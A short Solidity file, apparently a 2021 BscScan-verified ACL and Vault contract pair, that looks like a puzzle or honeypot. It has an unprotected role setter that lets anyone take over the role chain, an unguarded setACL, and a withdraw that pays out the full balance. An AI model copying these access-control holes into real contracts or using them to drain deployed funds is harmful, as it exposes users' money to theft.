/**
 *Submitted for verification at BscScan.com on 2021-07-28
*/

pragma solidity ^0.4.23;

contract ACL {
    
    address private role5999294130779334338;

    address private role7123909213907581092;

    address private role8972381298910001230;

    function getACLRole5999294130779334338() public view returns (address) {
        return role5999294130779334338;
    }

    function getACLRole8972381298910001230() public view returns (address) {
        return role8972381298910001230;
    }

    function getACLRole7123909213907581092() public view returns (address) {
        return role7123909213907581092;
    }

    function setACLRole7123909213907581092(address _role) public {
        role7123909213907581092 = _role;
    }

    function setACLRole8972381298910001230(address _role) public {
        require(msg.sender == role7123909213907581092);
        role8972381298910001230 = _role;
    }

    function setACLRole5999294130779334338(address _role) public {
        require(msg.sender == role8972381298910001230);
        role5999294130779334338 = _role;
    }
}

contract Vault {

    ACL private acl;

    event WithDrawCalled(uint256 msg_value, uint256 balance, address sender);

    function setACL(ACL _upgradeableAcl) public {
        require(acl == address(0));
        acl = _upgradeableAcl;
    }

    function () public payable {
    }
    
    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() public payable {
        emit WithDrawCalled(msg.value, balance(), msg.sender);

        require(balance() > msg.value, "not enough value");
        require(msg.value > balance() - msg.value, "whatever"); // we just want msg.value > original balance
        require(msg.sender == acl.getACLRole8972381298910001230(), "bouh!");
        acl.getACLRole5999294130779334338().transfer(balance());
    }
}